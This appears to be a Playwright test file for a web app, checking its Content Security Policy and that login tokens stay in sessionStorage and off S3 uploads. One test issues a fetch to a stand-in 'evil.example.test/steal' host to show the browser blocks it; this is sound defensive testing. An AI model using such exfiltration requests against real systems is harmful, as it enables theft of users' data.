import { test as plain } from '@playwright/test';
import { expect, test } from './fixtures';
import { logIn, startScanFlow } from './helpers';

// These tests use plain Playwright: they break the policy on purpose, which the usual watcher
// in ./fixtures would (rightly) report as a failure.
plain.describe('Content Security Policy, in a real browser', () => {
  plain(
    'the page has the fixed policy, and a second one that allows only the site, the API and S3',
    async ({ page }) => {
      await page.goto('/login/');
      await page.waitForSelector('#connect-policy', { state: 'attached' });

      const policies = await page.$$eval('meta[http-equiv="Content-Security-Policy"]', (metas) =>
        metas.map((meta) => meta.getAttribute('content')),
      );
      expect(policies).toHaveLength(2);
      expect(policies[0]).toContain("script-src 'self' 'unsafe-inline'");
      expect(policies[0]).toContain("object-src 'none'");
      expect(policies[1]).toBe(
        "connect-src 'self' https://e2e-api.example.test https://*.amazonaws.com",
      );
    },
  );

  plain('a request to any other site is blocked by the browser', async ({ page }) => {
    await page.goto('/login/');
    await page.waitForSelector('#connect-policy', { state: 'attached' });

    const blocked = await page.evaluate(
      () =>
        new Promise<{ directive: string; uri: string }>((resolve) => {
          document.addEventListener('securitypolicyviolation', (event) =>
            resolve({ directive: event.effectiveDirective, uri: event.blockedURI }),
          );
          fetch('https://evil.example.test/steal').catch(() => {});
        }),
    );

    expect(blocked.directive).toBe('connect-src');
    expect(blocked.uri).toContain('evil.example.test');
  });

  plain('a page cannot be framed from inside, and plugins are off', async ({ page }) => {
    await page.goto('/login/');

    const blocked = await page.evaluate(
      () =>
        new Promise<string>((resolve) => {
          document.addEventListener('securitypolicyviolation', (event) =>
            resolve(event.effectiveDirective),
          );
          const frame = document.createElement('iframe');
          frame.src = 'https://example.com/';
          document.body.appendChild(frame);
        }),
    );

    expect(blocked).toBe('frame-src');
  });
});

test.describe('secrets stay where they belong', () => {
  test('the login token is only in sessionStorage: never in localStorage, the address bar or the page', async ({
    page,
  }) => {
    await logIn(page);

    const stored = await page.evaluate(() => ({
      session: JSON.parse(sessionStorage.getItem('ush-session') ?? '{}') as { token?: string },
      localKeys: Object.keys(localStorage),
      localValues: Object.values(localStorage),
    }));
    const token = stored.session.token ?? '';
    expect(token.split('.')).toHaveLength(3); // a login token is there...
    expect(stored.localKeys.every((key) => key === 'theme')).toBe(true); // ...but only the theme is in localStorage
    expect(stored.localValues.join('')).not.toContain(token);
    expect(page.url()).not.toContain(token);
    expect(await page.content()).not.toContain(token);
  });

  test('API calls carry the login token, and the upload to S3 does not', async ({ page }) => {
    const apiAuth: (string | undefined)[] = [];
    const uploadAuth: (string | undefined)[] = [];
    page.on('request', async (request) => {
      const url = request.url();
      const headers = await request.allHeaders();
      if (url.startsWith('https://e2e-api.example.test/') && !url.endsWith('/login'))
        apiAuth.push(headers.authorization);
      if (url.includes('.amazonaws.com/')) uploadAuth.push(headers.authorization);
    });

    await logIn(page);
    await startScanFlow(page, { type: 'SAST', project: 'e2e-secrets' });
    await expect(page.getByRole('heading', { name: 'Results' })).toBeVisible();

    expect(apiAuth.length).toBeGreaterThan(3);
    expect(apiAuth.every((value) => value?.startsWith('Bearer ey'))).toBe(true);
    expect(uploadAuth.length).toBeGreaterThan(0); // the zip really was sent
    expect(uploadAuth.every((value) => value === undefined)).toBe(true); // and without Authorization
  });
});
